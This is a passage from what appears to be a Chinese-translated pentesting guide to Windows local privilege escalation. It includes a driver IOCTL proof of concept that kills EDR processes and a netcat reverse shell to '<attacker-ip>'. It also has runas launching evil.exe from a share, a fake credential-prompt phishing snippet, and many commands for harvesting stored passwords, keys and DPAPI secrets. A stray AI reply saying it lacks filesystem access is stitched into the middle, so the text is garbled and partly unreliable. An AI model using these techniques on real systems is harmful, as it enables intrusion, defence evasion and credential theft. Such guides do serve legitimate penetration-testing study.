driverquery /SI
```
如果驱动暴露了任意内核读/写原语（在设计不良的 IOCTL 处理程序中常见），可以直接从内核内存窃取 SYSTEM 令牌来提升权限。具体的分步说明见：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

对于竞态条件漏洞，若易受攻击的调用会打开由攻击者控制的 Object Manager 路径，通过故意放慢查找（例如使用最大长度的组件或深层目录链）可以将窗口从微秒级拉长到数十微秒：

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### 注册表 hive 内存破坏原语

现代的 hive 漏洞允许你构造确定性布局、滥用可写的 HKLM/HKU 子项，并将元数据损坏转换为内核分页池溢出，而无需自定义驱动。完整链式利用见：

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### 滥用设备对象上缺失的 FILE_DEVICE_SECURE_OPEN（LPE + EDR 杀伤）

一些已签名的第三方驱动通过 IoCreateDeviceSecure 使用强 SDDL 创建其设备对象，但忘记在 DeviceCharacteristics 中设置 FILE_DEVICE_SECURE_OPEN。没有该标志，当通过包含额外组件的路径打开设备时，安全 DACL 将不会被强制执行，这让任何非特权用户通过使用类似以下的命名空间路径获得句柄：

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (来自真实案例)

一旦用户可以打开该设备，驱动暴露的特权 IOCTLs 就可以被滥用于 LPE 和篡改。实战中观察到的示例能力：
- 向任意进程返回完全访问句柄（通过 DuplicateTokenEx/CreateProcessAsUser 进行令牌窃取 / 获取 SYSTEM shell）。
- 不受限制的原始磁盘读/写（离线篡改、引导时持久化技巧）。
- 终止任意进程，包括 Protected Process/Light (PP/PPL)，允许通过内核从用户态终止 AV/EDR。

最小 PoC 模式（用户态）：
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
缓解措施（针对开发者）
- 在创建打算通过 DACL 限制的 设备对象 时，始终设置 FILE_DEVICE_SECURE_OPEN。
- 对特权操作验证调用者上下文。在允许进程终止或返回句柄之前，添加 PP/PPL 检查。
- 限制 IOCTLs（access masks、METHOD_*、输入验证），并考虑使用 brokered models 而非直接授予内核权限。

检测思路（针对防御方）
- 监控用户模式对可疑设备名的打开（例如 \\ .\\amsdk*）以及表明滥用的特定 IOCTL 序列。
- 强制执行 Microsoft 的 vulnerable driver blocklist（HVCI/WDAC/Smart App Control），并维护你自己的允许/拒绝列表。


## PATH DLL Hijacking

如果你有 **在 PATH 中某个文件夹内的写权限**，你可能能够劫持一个被进程加载的 DLL 并 **提权**。

检查 PATH 中所有文件夹的权限：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
有关如何滥用此检查的更多信息：

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## 网络

### 共享
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

检查 hosts file 中是否有其他已知计算机的硬编码条目
```
type C:\Windows\System32\drivers\etc\hosts
```
### 网络接口 & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 开放端口

从外部检查是否存在 **受限服务**
```bash
netstat -ano #Opened ports?
```
### 路由表
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP 表
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### 防火墙规则

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(列出规则、创建规则、关闭、关闭...)**

更多[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### 适用于 Linux 的 Windows 子系统 (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
二进制文件 `bash.exe` 也可以在 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` 找到。

如果你获得 root 用户权限，你可以在任何端口监听（第一次使用 `nc.exe` 在端口上监听时，GUI 会弹出提示，询问是否允许 `nc` 通过防火墙）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
要以 root 身份轻松启动 bash，可以尝试 `--default-user root`

你可以在文件夹 `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` 中浏览 `WSL` 文件系统

## Windows 凭证

### Winlogon 凭证
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

来自 [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault 存储供服务器、网站和其他程序使用的用户凭证，**Windows** 可以**自动替用户登录**。乍看之下，这似乎意味着用户可以在此存储他们的 Facebook、Twitter、Gmail 等凭证，以便通过浏览器自动登录。但事实并非如此。

Windows Vault 存储的是能被 Windows 用于自动登录的凭证，这意味着任何 **需要凭证以访问资源的 Windows application**（服务器或网站）**可以使用这个 Credential Manager** 和 Windows Vault，使用存储的凭证，而不是让用户每次输入用户名和密码。

除非应用程序与 Credential Manager 交互，否则我认为它们无法使用给定资源的凭证。因此，如果你的应用程序想使用 vault，它应该以某种方式**与 Credential Manager 通信并请求该资源的凭证**，从默认存储 vault 中获取。

使用 `cmdkey` 列出机器上存储的凭证。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
然后你可以使用 `runas` 的 `/savecred` 选项来使用已保存的凭据。下面的示例通过 SMB 共享 调用远程二进制文件。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
使用提供的一组凭据运行 `runas`。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
注意：mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)，或来自 [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)。

### DPAPI

The **数据保护 API (DPAPI)** 提供了一种对数据进行对称加密的方法，主要在 Windows 操作系统内用于对非对称私钥进行对称加密。该加密利用用户或系统的秘密以显著增加熵。

**DPAPI 通过从用户登录秘密派生的对称密钥来实现对密钥的加密**。在涉及系统加密的场景中，它使用系统的域认证秘密。

使用 DPAPI 加密的用户 RSA 密钥存放在 `%APPDATA%\Microsoft\Protect\{SID}` 目录中，其中 `{SID}` 表示用户的 [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)。**DPAPI 密钥与保护用户私钥的主密钥位于同一文件中**，通常由 64 字节的随机数据组成。（需要注意的是，对该目录的访问受到限制，不能通过 `dir` 命令在 CMD 中列出其内容，但可以通过 PowerShell 列出。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
你可以使用 **mimikatz module** `dpapi::masterkey` 并带上适当的参数（`/pvk` 或 `/rpc`）来解密它。

这些 **credentials files protected by the master password** 通常位于：
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
你可以使用 **mimikatz module** `dpapi::cred` 并使用适当的 `/masterkey` 进行解密。\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).
你可以使用 `sekurlsa::dpapi` 模块（如果你是 root）从 **memory** 中提取许多 DPAPI **masterkeys**。

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell 凭据

**PowerShell credentials** 常用于 **scripting** 和自动化任务，作为一种方便存储加密凭据的方式。该凭据使用 **DPAPI** 保护，通常意味着只有在创建它们的相同用户和相同计算机上才能解密。

要从包含凭据的文件中**解密** PowerShell 凭据，你可以这样做：
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 已保存的 RDP 连接

可以在以下位置找到它们： `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
以及在 `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### 最近运行的命令
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **远程桌面凭据管理器**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

检查 `C:\Windows\CCM\SCClient.exe` 是否存在 .\
安装程序以 **SYSTEM privileges** 运行，许多容易受到 **DLL Sideloading (信息来自** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## 文件与注册表 (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH 主机密钥
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### 注册表中的 SSH 密钥

SSH 私钥可以存储在注册表键 `HKCU\Software\OpenSSH\Agent\Keys` 中，所以你应该检查那里是否有什么有趣的内容：
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
如果你在该路径中发现任何条目，通常是已保存的 SSH 密钥。它以加密形式存储，但可以使用 [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract)。\
关于此技术的更多信息请见： [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

如果 `ssh-agent` 服务未运行并且你希望它在启动时自动运行，请执行：
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> 看起来这个方法不再有效。我尝试创建一些 ssh keys，使用 `ssh-add` 添加它们，并通过 ssh 登录到一台机器。注册表 HKCU\Software\OpenSSH\Agent\Keys 不存在，procmon 在 asymmetric key authentication 过程中未识别到对 `dpapi.dll` 的使用。

### 无人值守的文件
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
你也可以使用 **metasploit** 来搜索这些文件： _post/windows/gather/enum_unattend_

示例内容：
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM 备份
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### 云凭证
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

搜索名为 **SiteList.xml** 的文件

### 缓存的 GPP 密码

以前有一个功能允许通过 Group Policy Preferences (GPP) 在一组机器上部署自定义本地管理员账户。但该方法存在严重的安全缺陷。首先，作为 XML 文件存放在 SYSVOL 中的 Group Policy Objects (GPOs) 可以被任何域用户访问。其次，这些 GPP 中的密码使用一个公开文档化的默认密钥用 AES256 加密，任何经过身份验证的用户都可以解密。这构成了严重风险，可能使用户获取提权。

为缓解此风险，开发了一个函数来扫描本地缓存的包含非空 "cpassword" 字段的 GPP 文件。发现此类文件后，该函数解密密码并返回一个自定义的 PowerShell 对象。该对象包含有关 GPP 和文件位置的详细信息，有助于识别和修复该安全漏洞。

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**要解密 cPassword：**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
使用 crackmapexec 获取密码：
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web 配置
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
带有凭据的 web.config 示例：
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 凭据
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### 日志
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 询问 credentials

如果你认为他可能知道，你总是可以**要求用户输入他的credentials，甚至其他用户的credentials**（注意，**直接向客户索要credentials**是非常**危险**的）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **可能包含 credentials 的文件名**

已知有些文件曾在一段时间前以 **passwords** 的 **clear-text** 或 **Base64** 形式包含这些信息。
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don’t have access to your filesystem or repository. Please do one of the following so I can help:

- Paste the contents of src/windows-hardening/windows-local-privilege-escalation/README.md here, or  
- Upload the relevant files (or a ZIP) you want searched, or  
- Tell me the exact search term(s) and provide the list of files/paths to search.

If you want a translation, paste the file content and I’ll translate the English parts to Chinese following your rules.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### 回收站中的凭证

你也应该检查回收站以寻找其中的凭证

要**恢复由多个程序保存的密码**，你可以使用: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### 在注册表中

**可能包含凭证的其他注册表键**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### 浏览器历史

你应该检查保存 **Chrome or Firefox** 密码的 dbs。\
还要检查浏览器的历史记录、书签和收藏夹，因为可能有些 **密码** 存储在其中。

用于从浏览器提取密码的工具：

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** 是 Windows 操作系统内置的一项技术，允许不同语言的软件组件之间进行相互通信。每个 COM 组件通过 class ID (CLSID) 进行标识，并且每个组件通过一个或多个接口（由 interface IDs (IIDs) 标识）来暴露功能。

COM 类和接口在注册表中分别定义于 **HKEY\CLASSES\ROOT\CLSID** 和 **HKEY\CLASSES\ROOT\Interface**。这个注册表是通过合并 **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** 而形成的，即 **HKEY\CLASSES\ROOT**。

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

基本上，如果你能够**overwrite any of the DLLs**（这些 DLL 将会被执行），并且该 DLL 会由不同的用户执行，那么你就可能**escalate privileges**。

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**搜索具有特定文件名的文件**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**在注册表中搜索键名和密码**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### 搜索 passwords 的工具

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **是一个 msf** 插件。我创建此插件以 **自动执行所有 metasploit POST 模块（用于搜索 credentials）** 在受害主机上。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 自动搜索本页中提到的所有包含 passwords 的文件。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) 是另一个从系统中提取 password 的优秀工具。

该工具 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) 会搜索若干以明文保存此类数据的工具的 **sessions**, **usernames** 和 **passwords**（PuTTY、WinSCP、FileZilla、SuperPuTTY，和 RDP）
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

想象一下，**一个以 SYSTEM 身份运行的进程用** (`OpenProcess()`) **打开了一个新的进程**，并具有 **full access**。同一进程**也用** (`CreateProcess()`) **创建了一个新的低权限进程，但继承了主进程的所有打开句柄**。\
然后，如果你对该低权限进程拥有 **full access**，你可以获取由 `OpenProcess()` 创建的特权进程的**打开 handle**并**注入 shellcode**。\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

共享内存段，称为 **pipes**，用于进程间通信和数据传输。

Windows 提供了名为 **Named Pipes** 的功能，允许无关进程甚至跨网络共享数据。这类似于客户端/服务器架构，角色定义为 **named pipe server** 和 **named pipe client**。

当 **client** 通过 pipe 发送数据时，设置该 pipe 的 **server**（前提是具有必要的 **SeImpersonate** 权限）可以**采用 client 的身份**。识别一个通过你能模拟的 pipe 与之通信的 **privileged process**，就有机会在该进程与您建立的 pipe 交互时，采用该进程的身份以**获取更高权限**。关于如何执行此类攻击的说明，请参见 [**here**](named-pipe-client-impersonation.md) 和 [**here**](#from-high-integrity-to-system)。

此外，下面的工具允许你**用类似 burp 的工具拦截 named pipe 通信：** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **而这个工具则可以列出并查看所有 pipe 以寻找 privescs：** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

